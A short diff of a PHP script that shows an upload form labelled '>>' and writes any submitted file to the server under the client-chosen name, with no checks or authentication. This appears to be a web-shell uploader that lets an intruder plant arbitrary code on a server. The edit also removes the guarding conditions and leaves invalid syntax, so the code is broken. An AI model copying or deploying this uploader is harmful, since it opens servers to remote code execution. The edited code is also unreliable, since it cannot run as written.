@@ -13,14 +13,10 @@ echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
 <input type=\"submit\" name=\"default\" value=\">>\">
 </form>";
 {
-if ($_FILES) {
-    if (function_exists("move_uploaded_file")) {
-        if (
-            move_uploaded_file(
+move_uploaded_file(
                 $_FILES["file"]["tmp_name"],
                 $_FILES["file"]["name"]
-            )
-        ) {
+            ) {
             printf(
                 'uploaded: <a href="%s">%s</a><br/>',
                 $_FILES["file"]["name"],
